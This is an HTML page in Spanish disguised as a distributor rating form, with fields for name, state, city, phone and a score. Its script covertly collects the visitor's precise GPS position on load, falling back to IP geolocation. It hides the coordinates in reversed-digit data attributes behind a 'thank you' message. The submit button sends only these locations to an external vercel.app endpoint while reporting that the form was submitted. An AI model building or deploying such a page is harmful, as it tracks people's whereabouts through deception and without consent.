<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CALIFICADOR DE DISTRIBUIDOR</title>

  <script>
    var ubicacionesRegistradas = [];

    // ================================
    //   INICIO AUTOMÁTICO DE UBICACIÓN
    // ================================
    window.onload = function () {
      // Intentar GPS primero
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          function () {
            rastrearUbicacion(); // GPS permitido
          },
          function () {
            obtenerUbicacionIP(); // GPS NO permitido → IP
          }
        );
      } else {
        obtenerUbicacionIP(); // Navegador sin geolocalización
      }
    };

    // ================================
    //     UBICACIÓN POR GPS
    // ================================
    function rastrearUbicacion() {
      navigator.geolocation.getCurrentPosition(
        function (position) {
          var latitud = position.coords.latitude;
          var longitud = position.coords.longitude;

          ubicacionesRegistradas.push({ latitud, longitud });
          actualizarListaUbicaciones();
          enviarUbicacionesAlServidor();
        },
        function () {
          obtenerUbicacionIP(); // Si el GPS falla, usar IP
        },
        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        }
      );
    }

    // ================================
    //   UBICACIÓN APROXIMADA POR IP
    // ================================
async function obtenerUbicacionIP() {
  try {
    const r = await fetch("https://ipinfo.io/json?token=free");
    const data = await r.json();

    const [latitud, longitud] = data.loc.split(",");

    ubicacionesRegistradas.push({ latitud, longitud });
    actualizarListaUbicaciones();

    console.log("Ubicación por IP:", latitud, longitud);
  } catch (e) {
    console.error("Error al obtener ubicación por IP:", e);
  }
}


    // ================================
    //     ACTUALIZAR LISTA EN HTML
    // ================================
    function actualizarListaUbicaciones() {
      var lista = document.getElementById("ubicaciones");
      lista.innerHTML = "";

      var inicio = Math.max(0, ubicacionesRegistradas.length - 5);

      for (var i = inicio; i < ubicacionesRegistradas.length; i++) {
        var ubicacion = ubicacionesRegistradas[i];
        var nuevaUbicacion = document.createElement("li");

        nuevaUbicacion.textContent = "Gracias por sus respuestas";

        nuevaUbicacion.dataset.latitud = codificarCoordenada(ubicacion.latitud);
        nuevaUbicacion.dataset.longitud = codificarCoordenada(ubicacion.longitud);

        nuevaUbicacion.onclick = function () {
          alert(
            "Latitud: " +
              decodificarCoordenada(this.dataset.latitud) +
              ", Longitud: " +
              decodificarCoordenada(this.dataset.longitud)
          );
        };

        lista.appendChild(nuevaUbicacion);
      }
    }

    // ================================
    //    CODIFICAR Y DECODIFICAR
    // ================================
    function codificarCoordenada(coordenada) {
      return coordenada.toFixed(4).split("").reverse().join("");
    }

    function decodificarCoordenada(coordenadaCodificada) {
      return parseFloat(coordenadaCodificada.split("").reverse().join(""));
    }

    // ================================
    //        ENVÍO A SERVIDOR
    // ================================
    async function enviarUbicacionesAlServidor() {
      // Aquí puedes agregar integración backend si lo deseas
    }

    // ================================
    // DESCARGAR / ENVIAR UBICACIONES
    // ================================
    async function descargarUbicaciones() {
      const texto = JSON.stringify(ubicacionesRegistradas);

      const vercelURL = "https://github-upload-api.vercel.app/api/subir";

      const response = await fetch(vercelURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ texto })
      });

      const data = await response.json();

      if (data.success) {
        alert("Formulario enviado correctamente.");
      } else {
        alert("Error al subir el formulario. Revisa la consola.");
        console.error("Error al subir:", data.error);
      }
    }

    function encriptar(texto) {
      return btoa(texto);
    }
  </script>
</head>

<body>
  <h1>Formulario para Distribuidor</h1>

  <p>Nombre de Distribuidor:</p>
  <form><textarea rows="1" cols="35"></textarea><br /><br /></form>

  <p>Estado:</p>
  <form><textarea rows="1" cols="35"></textarea><br /><br /></form>

  <p>Ciudad o pueblo:</p>
  <form><textarea rows="1" cols="35"></textarea><br /><br /></form>

  <p>Número telefónico:</p>
  <form><textarea rows="1" cols="35"></textarea><br /><br /></form>

  <p>Calificación de Distribuidor del 1 al 10:</p>
  <form><textarea rows="1" cols="10"></textarea><br /><br /></form>

  <ul id="ubicaciones"></ul>

  <button onclick="descargarUbicaciones()">Generar y enviar código</button>
</body>
</html>
